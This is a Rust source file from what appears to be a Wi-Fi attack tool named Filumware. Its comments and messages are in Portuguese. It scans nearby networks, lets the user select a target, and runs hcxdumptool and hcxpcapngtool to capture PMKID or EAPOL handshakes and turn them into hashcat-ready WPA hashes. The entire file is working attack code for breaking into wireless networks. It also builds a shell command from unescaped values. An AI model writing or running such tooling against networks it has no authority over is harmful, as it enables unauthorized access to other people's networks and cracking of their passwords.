use crate::core::variables::{GlobalStates, NetworkTarget, UserHardwareInfo};
use crate::utils::archives::create_folder;
use crate::utils::aux::{
    calculate_rssi, check_root_privileges, format_bssid, format_rsn, format_security, run_command,
    valid_interface,
};
use anyhow::{Result, anyhow};
use crossterm::{
    event::{self, Event, KeyCode},
    execute,
    terminal::{EnterAlternateScreen, LeaveAlternateScreen, disable_raw_mode, enable_raw_mode},
};
use ratatui::{
    Terminal,
    backend::CrosstermBackend,
    layout::{Constraint, Direction, Layout},
    style::{Color, Modifier, Style},
    widgets::{Block, Borders, Cell, Paragraph, Row, Table, TableState},
};
use std::{
    process::Command as StdCommand,
    sync::{Arc, Mutex},
    time::{Duration, Instant},
};
use tokio::time::sleep;
pub fn pipe_hardware() -> Result<UserHardwareInfo> {
    if !check_root_privileges() {
        return Err(anyhow!(
            "O Filumware precisa ser executado obrigatoriamente como root (sudo) para gerenciar interfaces sem fio!"
        ));
    }

    let cpu = run_command("grep -m 1 'model name' /proc/cpuinfo | cut -d: -f2")
        .unwrap_or_else(|_| "Desconhecido".to_string());

    let gpu = run_command("lspci | grep -E 'VGA' | cut -d: -f3")
        .unwrap_or_else(|_| "Desconhecido".to_string());

    let ram = run_command("grep 'MemTotal' /proc/meminfo | awk '{print $2, $3}'")
        .unwrap_or_else(|_| "Desconhecido".to_string());

    let os = run_command("grep 'PRETTY_NAME' /etc/os-release | cut -d= -f2 | tr -d '\"'")
        .unwrap_or_else(|_| "Linux Genérico".to_string());

    let network_interface = match run_command("iw dev | grep 'Interface'") {
        Ok(iface) if !iface.is_empty() => {
            let first_iface = iface.lines().next().unwrap_or("").trim().to_string();
            if first_iface.is_empty() {
                return Err(anyhow!(
                    "Nenhuma interface Wi-Fi ativa foi encontrada pelo NetworkManager!"
                ));
            }
            first_iface
        }
        _ => {
            return Err(anyhow!(
                "Nenhuma interface Wi-Fi disponível ou o serviço nmcli está inativo."
            ));
        }
    };

    Ok(UserHardwareInfo {
        cpu: cpu.trim().to_string(),
        gpu: gpu.trim().to_string(),
        ram: ram.trim().to_string(),
        os: os.trim().to_string(),
        network_interface,
    })
}

impl NetworkTarget {
    pub fn from_nmcli_line(line: &str) -> Option<Self> {
        let parts: Vec<&str> = line.split(':').collect();

        if parts.len() < 11 {
            return None;
        }

        let raw_bssid = parts[0..6].join(":");
        let bssid = format_bssid(&raw_bssid);
        let mac_address = bssid.clone();

        let ssid = parts[6].to_string();
        let rssi_pct: i32 = parts[7].parse().unwrap_or(0);
        let rssi = calculate_rssi(rssi_pct);

        let frequency: u32 = parts[8].parse().unwrap_or(0);
        let channel: u32 = parts[9].parse().unwrap_or(0);
        let security_raw = parts[10..].join(":");

        let security = format_security(&security_raw);
        let rsn = format_rsn(&security_raw);

        let vendor_oui = if bssid.len() >= 8 {
            bssid[0..8].to_string()
        } else {
            "Desconhecido".to_string()
        };

        let wps_active = security_raw.to_uppercase().contains("WPS");

        Some(NetworkTarget {
            ssid: if ssid.is_empty() {
                "<Rede Oculta>".into()
            } else {
                ssid
            },
            bssid,
            mac_address,
            rssi,
            rsn,
            frequency,
            channel,
            security,
            vendor_oui,
            wps_active,
            target_dir: "".into(),
            pmkid_captured: None,
        })
    }
}

// Função de varredura idêntica ao uibase (sem travas de interface restritivas)
fn scan_networks() -> Vec<NetworkTarget> {
    let output = StdCommand::new("nmcli")
        .args(&[
            "-t",
            "-f",
            "BSSID,SSID,SIGNAL,BAND,CHAN,SECURITY",
            "dev",
            "wifi",
            "list",
            "--rescan",
            "yes",
        ])
        .output();

    let mut targets = Vec::new();
    if let Ok(out) = output {
        let stdout = String::from_utf8_lossy(&out.stdout);
        for line in stdout.lines() {
            if let Some(target) = NetworkTarget::from_nmcli_line(line) {
                if !targets
                    .iter()
                    .any(|t: &NetworkTarget| t.bssid == target.bssid)
                {
                    targets.push(target);
                }
            }
        }
    }
    targets
}

/// Pipeline de Storage com varredura autônoma de 5s e tabela interativa (Padrão Uibase)
pub async fn pipe_storage() -> Result<Option<NetworkTarget>> {
    let hardware_info = match pipe_hardware() {
        Ok(info) => info,
        Err(e) => {
            return Err(anyhow!(
                "Aviso: Falha ao verificar a interface Wi-Fi. Certifique-se de que está ativa. Erro: {}",
                e
            ));
        }
    };

    let interface = hardware_info.network_interface;

    if let Err(e) = valid_interface(&interface) {
        let alert = crate::utils::ui::render_alert(&e.to_string());
        eprintln!("{}", alert);
        return Err(anyhow!(alert));
    }

    // Configura o terminal no modo raw exatamente como no uibase
    enable_raw_mode()?;
    let mut stdout = std::io::stdout();
    execute!(stdout, EnterAlternateScreen)?;
    let backend = CrosstermBackend::new(stdout);
    let mut terminal = Terminal::new(backend)?;

    let networks = Arc::new(Mutex::new(Vec::<NetworkTarget>::new()));
    let networks_clone = Arc::clone(&networks);

    // Thread de Polling em Segundo Plano (a cada 5 segundos)[cite: 35]
    tokio::spawn(async move {
        loop {
            let scanned = scan_networks();
            {
                let mut lock = networks_clone.lock().unwrap();
                *lock = scanned;
            }
            sleep(Duration::from_secs(5)).await;
        }
    });

    let mut table_state = TableState::default();
    table_state.select(Some(0));

    let mut selected_target: Option<NetworkTarget> = None;
    let tick_rate = Duration::from_millis(200);
    let mut last_tick = Instant::now();

    // Loop principal da TUI de varredura
    loop {
        let current_networks = {
            let lock = networks.lock().unwrap();
            lock.clone()
        };

        terminal.draw(|f| {
            let chunks = Layout::default()
                .direction(Direction::Vertical)
                .margin(1)
                .constraints(
                    [
                        Constraint::Length(3),
                        Constraint::Min(10),
                        Constraint::Length(3),
                    ]
                    .as_ref(),
                )
                .split(f.area());

            let header = Paragraph::new("=== Escaneando as redes ao seu redor ===")
                .style(
                    Style::default()
                        .fg(Color::Cyan)
                        .add_modifier(Modifier::BOLD),
                )
                .block(
                    Block::default()
                        .borders(Borders::ALL)
                        .title(" FILUMWARE - SCAN "),
                );
            f.render_widget(header, chunks[0]);

            let rows: Vec<Row> = current_networks
                .iter()
                .map(|net| {
                    Row::new(vec![
                        Cell::from(net.ssid.clone()),
                        Cell::from(net.bssid.clone()),
                        Cell::from(format!("{} dBm", net.rssi)),
                        Cell::from(net.channel.to_string()),
                        Cell::from(format!("{} MHz", net.frequency)),
                        Cell::from(net.security.clone()),
                    ])
                })
                .collect();

            let table = Table::new(
                rows,
                [
                    Constraint::Percentage(25),
                    Constraint::Percentage(25),
                    Constraint::Percentage(10),
                    Constraint::Percentage(10),
                    Constraint::Percentage(15),
                    Constraint::Percentage(15),
                ],
            )
            .header(
                Row::new(vec!["SSID", "BSSID", "RSSI", "CANAL", "BAND", "SEGURANÇA"]).style(
                    Style::default()
                        .fg(Color::Yellow)
                        .add_modifier(Modifier::BOLD),
                ),
            )
            .block(
                Block::default()
                    .borders(Borders::ALL)
                    .title(format!(" Redes Encontradas ({}) ", current_networks.len())),
            )
            .row_highlight_style(
                Style::default()
                    .bg(Color::Blue)
                    .fg(Color::White)
                    .add_modifier(Modifier::BOLD),
            )
            .highlight_symbol(">> ");

            f.render_stateful_widget(table, chunks[1], &mut table_state);

            let footer =
                Paragraph::new("Use [▲/▼] para navegar | [ENTER] para Selecionar Alvo | [Q] Sair")
                    .style(Style::default().fg(Color::Gray))
                    .block(Block::default().borders(Borders::ALL));
            f.render_widget(footer, chunks[2]);
        })?;

        // Captura de Eventos de Teclado
        let timeout = tick_rate.saturating_sub(last_tick.elapsed());
        if event::poll(timeout)? {
            if let Event::Key(key) = event::read()? {
                match key.code {
                    KeyCode::Char('q') | KeyCode::Char('Q') => break,
                    KeyCode::Down => {
                        let i = match table_state.selected() {
                            Some(i) => {
                                if current_networks.is_empty() {
                                    0
                                } else if i >= current_networks.len() - 1 {
                                    0
                                } else {
                                    i + 1
                                }
                            }
                            None => 0,
                        };
                        table_state.select(Some(i));
                    }
                    KeyCode::Up => {
                        let i = match table_state.selected() {
                            Some(i) => {
                                if current_networks.is_empty() {
                                    0
                                } else if i == 0 {
                                    current_networks.len().saturating_sub(1)
                                } else {
                                    i - 1
                                }
                            }
                            None => 0,
                        };
                        table_state.select(Some(i));
                    }
                    KeyCode::Enter => {
                        if let Some(i) = table_state.selected() {
                            if let Some(target) = current_networks.get(i) {
                                selected_target = Some(target.clone());
                                break;
                            }
                        }
                    }
                    _ => {}
                }
            }
        }

        if last_tick.elapsed() >= tick_rate {
            last_tick = Instant::now();
        }
    }

    // Restaura o terminal ao sair da TUI de varredura
    disable_raw_mode()?;
    execute!(terminal.backend_mut(), LeaveAlternateScreen)?;
    terminal.show_cursor()?;

    // Se um alvo foi selecionado, inicializa a pasta e preenche o target_dir
    if let Some(mut target) = selected_target {
        let created_path = create_folder(&target.bssid)?;
        let target_name = created_path
            .file_name()
            .and_then(|n| n.to_str())
            .unwrap_or("unknown_target")
            .to_string();

        let pwd_output = run_command("pwd").unwrap_or_else(|_| {
            std::env::current_dir()
                .unwrap_or_default()
                .to_string_lossy()
                .into_owned()
        });
        let pwd = pwd_output.trim().to_string();
        let folder_save = "attacks".to_string();

        target.target_dir = format!("{}/{}/{}", pwd, folder_save, target_name);

        let _global_states = GlobalStates {
            pwd,
            folder_save,
            target_name,
        };

        let bpf_cmd = format!(
            "hcxdumptool --bpfc=\"wlan addr3 {}\" > {}/{}.bpf",
            target.bssid, target.target_dir, _global_states.target_name
        );
        let _ = StdCommand::new("sh").arg("-c").arg(&bpf_cmd).status();

        let bpf_file_path = std::fs::read_dir(&target.target_dir)
            .ok()
            .and_then(|mut entries| {
                entries.find_map(|entry| {
                    let path = entry.ok()?.path();
                    if path.extension().and_then(|s| s.to_str()) == Some("bpf") {
                        Some(path.to_string_lossy().into_owned())
                    } else {
                        None
                    }
                })
            })
            .unwrap_or_else(|| format!("{}/{}.bpf", target.target_dir, _global_states.target_name));

        println!(
            "[*] Iniciando captura de PMKID para o alvo {} no canal {}...",
            target.bssid, target.channel
        );
        println!("[!] Pressione CTRL+C assim que o PMKID for capturado com sucesso.\n");

        let pcapng_output = format!(
            "{}/{}.pcapng",
            target.target_dir, _global_states.target_name
        );

        let status = StdCommand::new("sudo")
            .arg("hcxdumptool")
            .arg("-i")
            .arg(&interface)
            .arg("-w")
            .arg(&pcapng_output)
            .arg(format!("--bpf={}", bpf_file_path))
            .arg("-c")
            .arg(target.channel.to_string())
            .arg("--enable_status=15")
            .status();

        match status {
            Ok(s) if s.success() => {
                println!("\n[+] Processo do hcxdumptool encerrado.");
            }
            _ => {
                // Mesmo se interrompido por CTRL+C, verificamos se o arquivo contém dados válidos abaixo
            }
        }

        let hash_output_path =
            format!("{}/{}.22000", target.target_dir, _global_states.target_name);
        let essid_output_path = format!("{}/essidlist.txt", target.target_dir);

        println!("\n[*] Processando arquivo .pcapng com hcxpcapngtool para extrair PMKID/EAPOL...");

        let convert_status = StdCommand::new("hcxpcapngtool")
            .arg("-o")
            .arg(&hash_output_path)
            .arg("-E")
            .arg(&essid_output_path)
            .arg(&pcapng_output)
            .status();

        let mut captured_valid = false;

        match convert_status {
            Ok(s) if s.success() => {
                // Valida se o arquivo de hash foi criado, não está vazio e contém assinaturas WPA válidas
                if std::path::Path::new(&hash_output_path).exists() {
                    if let Ok(metadata) = std::fs::metadata(&hash_output_path) {
                        if metadata.len() > 0 {
                            if let Ok(content) = std::fs::read_to_string(&hash_output_path) {
                                if content.contains("WPA*") {
                                    captured_valid = true;
                                    target.pmkid_captured = Some(hash_output_path.clone());
                                    println!(
                                        "[✔ SUCESSO] Hash válido gerado em: {}",
                                        hash_output_path
                                    );
                                }
                            }
                        }
                    }
                }
            }
            _ => {}
        }

        if !captured_valid {
            println!("[✖ AVISO] Nenhum PMKID ou Handshake EAPOL válido foi encontrado na captura.");
            return Ok(None);
        }

        return Ok(Some(target));
    }

    Ok(None)
}
